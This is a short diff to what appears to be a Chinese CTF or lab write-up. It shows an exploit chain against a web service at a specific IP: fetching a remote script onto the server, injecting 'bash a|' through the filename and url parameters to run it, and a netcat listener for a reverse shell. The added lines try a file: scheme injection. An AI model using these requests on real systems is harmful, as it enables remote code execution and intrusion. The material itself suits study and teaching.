@@ -38,7 +38,8 @@ http://117.50.3.97:8004/?url=http://ipv4.ssssdl.xyz/aa.txt&filename=a
 http://117.50.3.97:8004/?url=&filename=bash a|
 公网服务器监听端口反弹shell
 nc -lvp 7777
-命令执行
+尝试命令执行：
+http://117.50.3.97:8004/?url=file:bash%20a|&filename=dadsdasd
 ```
 
 
